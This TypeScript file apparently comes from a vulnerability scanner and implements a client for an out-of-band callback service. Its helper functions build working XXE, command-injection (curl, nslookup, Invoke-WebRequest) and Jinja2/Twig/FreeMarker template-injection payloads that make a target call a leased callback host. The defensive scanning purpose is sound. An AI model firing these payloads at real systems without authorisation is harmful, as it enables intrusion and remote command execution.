import { runBoundedHttp } from "../modules/protocolSecurity/ProtocolTransports.js";
import type { ActiveGeneratedStrategy } from "../modules/activeVulnerability/ActiveVulnerabilityStrategies.js";
import type { ActiveOastPlan, ActiveVulnerabilityCasePlan } from "../modules/activeVulnerability/ActiveVulnerabilityTypes.js";
import type { OastEvidenceSummary, OastLeaseIdentity, OastLeaseRequest } from "./OastTypes.js";

export class OastClient {
  private readonly apiOrigin: string;
  private readonly apiToken: string;
  private readonly tlsCa?: string;
  public constructor(private readonly plan: ActiveOastPlan, private readonly timeoutMs: number, private readonly abortSignal?: AbortSignal) {
    const api = new URL(plan.apiBaseUrl); this.apiOrigin = api.origin;
    const token = process.env[plan.apiTokenEnv];
    if (!token || !/^[A-Za-z0-9._~-]{24,200}$/.test(token)) throw new Error("OAST_API_TOKEN_UNAVAILABLE");
    this.apiToken = token;
    if (plan.tlsCaEnv) { const ca = process.env[plan.tlsCaEnv]; if (!ca || ca.length > 65536 || !ca.includes("-----BEGIN CERTIFICATE-----")) throw new Error("OAST_TLS_CA_UNAVAILABLE"); this.tlsCa = ca; }
  }

  public async lease(caseId: string, strategyId: string): Promise<OastLeaseIdentity> {
    const request: OastLeaseRequest = { tenantId: this.plan.tenantId, workerId: this.plan.workerId, jobId: this.plan.jobId, caseId: `${caseId}:${strategyId}`, ttlSeconds: this.plan.leaseSeconds, protocols: this.plan.protocols };
    const result = await this.call("/v1/leases", "POST", this.apiToken, Buffer.from(JSON.stringify(request)));
    if (result.statusCode !== 201) throw new Error(`OAST_LEASE_HTTP_${result.statusCode}`);
    const value = parseObject(result.body);
    const leaseId = textField(value, "leaseId"), expiresAt = textField(value, "expiresAt"), dnsName = textField(value, "dnsName"), pollUrl = textField(value, "pollUrl"), pollToken = textField(value, "pollToken"), bindingFingerprint = hexField(value, "bindingFingerprint");
    const dnsLabels = dnsName.split(".");
    if (!/^[a-f0-9]{32}$/.test(leaseId) || !Number.isFinite(Date.parse(expiresAt)) || dnsLabels.length < 4 || dnsLabels[0] !== leaseId || !/^[a-f0-9]{32}$/.test(dnsLabels[1] ?? "") || !dnsLabels.slice(2).every((label) => /^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/.test(label))) throw new Error("OAST_LEASE_RESPONSE_INVALID");
    const httpUrl = optionalCallbackUrl(value.httpUrl, "http:", leaseId), httpsUrl = optionalCallbackUrl(value.httpsUrl, "https:", leaseId);
    const poll = new URL(pollUrl, this.apiOrigin);
    if (poll.origin !== this.apiOrigin || poll.username || poll.password || poll.pathname !== `/v1/leases/${leaseId}/events` || poll.search || poll.hash || !/^[A-Za-z0-9._~-]{24,200}$/.test(pollToken) || Date.parse(expiresAt) <= Date.now() || Date.parse(expiresAt) > Date.now() + this.plan.leaseSeconds * 1000 + 5000) throw new Error("OAST_LEASE_RESPONSE_INVALID");
    return { leaseId, expiresAt, dnsName, ...(httpUrl ? { httpUrl } : {}), ...(httpsUrl ? { httpsUrl } : {}), pollUrl: poll.toString(), pollToken, bindingFingerprint };
  }

  public materialize(strategy: ActiveGeneratedStrategy, lease: OastLeaseIdentity, testCase: ActiveVulnerabilityCasePlan): ActiveGeneratedStrategy {
    const protocol = strategy.oastProtocol; if (!protocol) return strategy;
    const identity = protocol === "DNS" ? lease.dnsName : protocol === "HTTPS" ? lease.httpsUrl : lease.httpUrl;
    if (!identity) throw new Error(`OAST_${protocol}_IDENTITY_UNAVAILABLE`);
    let probe: string;
    if (testCase.vulnerabilityClass === "SSRF") probe = identity;
    else if (testCase.vulnerabilityClass === "XXE") { if (protocol === "DNS") throw new Error("OAST_XXE_DNS_PROTOCOL_UNSUPPORTED"); probe = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY rc SYSTEM "${identity}">]><r>&rc;</r>`; }
    else if (testCase.vulnerabilityClass === "COMMAND_INJECTION") probe = commandProbe(testCase, protocol, identity, lease.dnsName);
    else if (testCase.vulnerabilityClass === "TEMPLATE_INJECTION") probe = templateProbe(testCase, protocol, identity, lease.dnsName);
    else throw new Error("OAST_CLASS_UNSUPPORTED");
    return { ...strategy, probe };
  }

  public async waitForEvent(lease: OastLeaseIdentity, protocol: ActiveGeneratedStrategy["oastProtocol"]): Promise<OastEvidenceSummary | undefined> {
    const deadline = Date.now() + Math.min(60_000, Math.max(1_000, this.plan.pollIntervalMs * this.plan.maxPolls));
    for (let attempt = 0; attempt < this.plan.maxPolls; attempt++) {
      if (attempt > 0) await wait(Math.min(this.plan.pollIntervalMs, Math.max(0, deadline - Date.now())), this.abortSignal);
      const remaining = deadline - Date.now(); if (remaining <= 0) return;
      const result = await this.callAbsolute(lease.pollUrl, "GET", lease.pollToken, undefined, Math.min(this.timeoutMs, remaining));
      if (result.statusCode !== 200) throw new Error(`OAST_POLL_HTTP_${result.statusCode}`);
      const value = parseObject(result.body);
      if (value.leaseId !== lease.leaseId || !["ACTIVE", "EXPIRED", "REVOKED"].includes(String(value.status)) || typeof value.expiresAt !== "string" || !Number.isFinite(Date.parse(value.expiresAt)) || !Array.isArray(value.events)) throw new Error("OAST_POLL_RESPONSE_INVALID");
      if (value.events.length > 100 || value.expiresAt !== lease.expiresAt) throw new Error("OAST_POLL_RESPONSE_INVALID");
      const events = value.events.map(validateEvent);
      if (events.some((event) => Date.parse(event.observedAt) > Date.parse(lease.expiresAt) || Date.parse(event.observedAt) > Date.now() + 5000)) throw new Error("OAST_POLL_RESPONSE_INVALID");
      const event = events.find((item) => item.protocol === protocol && item.bindingFingerprint === lease.bindingFingerprint);
      if (event) return event;
      if (value.status !== "ACTIVE") return;
    }
    return;
  }

  public async revoke(lease: OastLeaseIdentity): Promise<boolean> {
    // Scan cancellation must not cancel the bounded lease cleanup attempt.
    const result = await this.callAbsolute(lease.pollUrl, "DELETE", lease.pollToken, undefined, Math.min(this.timeoutMs, 3000), true);
    return result.statusCode === 204;
  }

  private call(path: string, method: string, token: string, body?: Buffer) { return this.callAbsolute(new URL(path, this.apiOrigin).toString(), method, token, body); }
  private callAbsolute(url: string, method: string, token: string, body?: Buffer, timeoutMs = this.timeoutMs, cleanup = false) {
    if (new URL(url).origin !== this.apiOrigin) throw new Error("OAST_API_ORIGIN_MISMATCH");
    return runBoundedHttp(url, method, { Authorization: `Bearer ${token}`, Accept: "application/json", ...(body ? { "Content-Type": "application/json" } : {}) }, body, { allowedPrivateOrigins: this.plan.mode === "SELF_HOSTED" ? [this.apiOrigin] : [], timeoutMs, maxBytes: 64 * 1024, ...(this.tlsCa ? { tlsCa: this.tlsCa } : {}), ...(!cleanup && this.abortSignal ? { abortSignal: this.abortSignal } : {}) });
  }
}

function commandProbe(testCase: ActiveVulnerabilityCasePlan, protocol: "DNS" | "HTTP" | "HTTPS", identity: string, dnsName: string): string {
  if (testCase.proof.commandDialect === "POWERSHELL") return protocol === "DNS" ? `;Resolve-DnsName '${dnsName}'` : `;Invoke-WebRequest -UseBasicParsing -TimeoutSec 2 '${identity}'`;
  return protocol === "DNS" ? `;nslookup '${dnsName}'` : `;curl -fsS --max-time 2 '${identity}'`;
}
function templateProbe(testCase: ActiveVulnerabilityCasePlan, protocol: "DNS" | "HTTP" | "HTTPS", identity: string, dnsName: string): string {
  const command = protocol === "DNS" ? `nslookup ${dnsName}` : `curl -fsS --max-time 2 ${identity}`;
  if (testCase.proof.templateDialect === "JINJA2") return `{{cycler.__init__.__globals__.os.popen('${command}').read()}}`;
  if (testCase.proof.templateDialect === "TWIG") return `{{['${command}']|filter('system')}}`;
  if (testCase.proof.templateDialect === "FREEMARKER") return `<#assign ex="freemarker.template.utility.Execute"?new()>${'${'}ex("${command}")}`;
  throw new Error("OAST_TEMPLATE_DIALECT_REQUIRED");
}
function parseObject(value: Buffer): Record<string, unknown> { let parsed: unknown; try { parsed = JSON.parse(value.toString("utf8")); } catch { throw new Error("OAST_RESPONSE_INVALID_JSON"); } if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) throw new Error("OAST_RESPONSE_INVALID"); return parsed as Record<string, unknown>; }
function textField(value: Record<string, unknown>, key: string): string { if (typeof value[key] !== "string" || !(value[key] as string).length) throw new Error("OAST_RESPONSE_INVALID"); return value[key] as string; }
function hexField(value: Record<string, unknown>, key: string): string { const text = textField(value, key); if (!/^[a-f0-9]{64}$/.test(text)) throw new Error("OAST_RESPONSE_INVALID"); return text; }
function optionalCallbackUrl(value: unknown, protocol: "http:" | "https:", leaseId: string): string | undefined { if (value === undefined) return; if (typeof value !== "string") throw new Error("OAST_RESPONSE_INVALID"); const parsed = new URL(value); if (parsed.protocol !== protocol || parsed.username || parsed.password || !new RegExp(`^/c/${leaseId}/[a-f0-9]{32}$`).test(parsed.pathname) || parsed.search || parsed.hash) throw new Error("OAST_RESPONSE_INVALID"); return parsed.toString(); }
function validateEvent(value: unknown): OastEvidenceSummary { if (!value || typeof value !== "object" || Array.isArray(value)) throw new Error("OAST_EVENT_INVALID"); const item = value as Record<string, unknown>; if (typeof item.eventId !== "string" || !/^[a-f0-9-]{36}$/i.test(item.eventId) || !["DNS", "HTTP", "HTTPS"].includes(String(item.protocol)) || typeof item.observedAt !== "string" || !Number.isFinite(Date.parse(item.observedAt)) || !Number.isInteger(item.delayMs) || (item.delayMs as number) < 0 || typeof item.sourceFingerprint !== "string" || !/^[a-f0-9]{64}$/.test(item.sourceFingerprint) || typeof item.requestFingerprint !== "string" || !/^[a-f0-9]{64}$/.test(item.requestFingerprint) || typeof item.bindingFingerprint !== "string" || !/^[a-f0-9]{64}$/.test(item.bindingFingerprint) || typeof item.replayRejected !== "boolean") throw new Error("OAST_EVENT_INVALID"); return item as unknown as OastEvidenceSummary; }
function wait(milliseconds: number, signal?: AbortSignal): Promise<void> { return new Promise((resolve, reject) => { const cleanup = () => signal?.removeEventListener("abort", abort); const timer = setTimeout(() => { cleanup(); resolve(); }, milliseconds); const abort = () => { clearTimeout(timer); cleanup(); reject(new Error("OAST_POLL_ABORTED")); }; signal?.addEventListener("abort", abort, { once: true }); if (signal?.aborted) abort(); }); }
